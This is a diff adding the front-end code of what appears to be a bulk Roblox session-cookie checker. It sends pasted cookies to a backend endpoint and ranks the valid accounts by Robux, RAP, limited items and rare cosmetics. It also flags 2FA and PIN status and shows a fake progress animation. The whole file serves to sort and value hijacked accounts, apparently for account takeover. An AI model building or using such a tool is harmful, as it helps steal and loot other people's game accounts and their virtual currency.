+  // Fake progress animation
+  let fakeProgress = 0;
+  const fakeIv = setInterval(() => {
+    if (fakeProgress < 90) {
+      fakeProgress += Math.random() * 3;
+      if (fakeProgress > 90) fakeProgress = 90;
+      document.getElementById('bulkProgressBar').style.width = fakeProgress + '%';
+    }
+  }, 300);
+
+  try {
+    const res = await fetch(CONFIG.backend + '/api/bulk-check-cookie', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookies: lines })
+    });
+
+    const r = await res.json();
+    clearInterval(fakeIv);
+    document.getElementById('bulkProgressBar').style.width = '100%';
+
+    if (!r.success) {
+      document.getElementById('bulkProgressText').textContent = 'Error: ' + (r.error || 'Unknown');
+      return;
+    }
+
+    renderBulkResults(r);
+    document.getElementById('bulkProgressText').textContent = 'Done!';
+    setTimeout(() => { document.getElementById('bulkProgress').style.display = 'none'; }, 1000);
+
+  } catch(e) {
+    clearInterval(fakeIv);
+    document.getElementById('bulkProgressText').textContent = 'Error: ' + e.message;
+  }
+}
+
+function renderBulkResults(r) {
+  const resultEl = document.getElementById('bulkResult');
+  resultEl.style.display = 'block';
+
+  let html = `
+    <div class="bulk-summary">
+      Total: <b>${r.total}</b> |
+      <span class="valid-count">✅ Valid: ${r.valid}</span> |
+      <span class="invalid-count">❌ Invalid: ${r.invalid}</span>
+    </div>
+  `;
+
+  const sorted = [...r.results].sort((a, b) => {
+    if (a.valid && !b.valid) return -1;
+    if (!a.valid && b.valid) return 1;
+    if (a.valid && b.valid) return (b.rap || 0) - (a.rap || 0);
+    return 0;
+  });
+
+  for (const item of sorted) {
+    if (item.valid) {
+      const rare = [];
+      if (item.hasKorblox) rare.push('🎩 Korblox');
+      if (item.hasHeadless) rare.push('💀 Headless');
+
+      html += `
+        <div class="bulk-item valid">
+          <img src="${item.avatar}" alt="">
+          <div class="info">
+            <div class="name">${item.user.name} <span style="color:#888; font-weight:400;">(${item.user.id})</span></div>
+            <div class="meta">${item.accountAge} days old${item.twoFAEnabled ? ' · 🔐 2FA' : ''}${item.pinEnabled ? ' · 🔒 PIN' : ''}</div>
+            ${rare.length ? `<div class="meta badge-rare">${rare.join(' · ')}</div>` : ''}
+          </div>
+          <div class="stats">
+            💰 ${item.robux}<br>
+            📊 ${item.rap} RAP<br>
+            📦 ${item.limitedsOwned}
+          </div>
+        </div>
+      `;
+    } else {
+      html += `
+        <div class="bulk-item invalid">
+          <div style="width:36px; height:36px; border-radius:50%; background:#393b3d; display:flex; align-items:center; justify-content:center;">❌</div>
+          <div class="info">
+            <div class="name" style="color:#888;">${item.label || 'Cookie #' + (item.index + 1)}</div>
+            <div class="meta" style="color:#ff4d4d;">${item.error || 'Invalid'}</div>
+          </div>
+        </div>
+      `;
+    }
+  }
+
+  resultEl.innerHTML = html;
+}
+
+function clearBulk() {
+  document.getElementById('bulkInput').value = '';
+  document.getElementById('bulkResult').style.display = 'none';
+  document.getElementById('bulkProgress').style.display = 'none';
+}
+
+// ============================================
+// INIT
+// ============================================
+window.addEventListener('DOMContentLoaded', () => {
+  render();
+});
+</script>
+</body>
+</html>
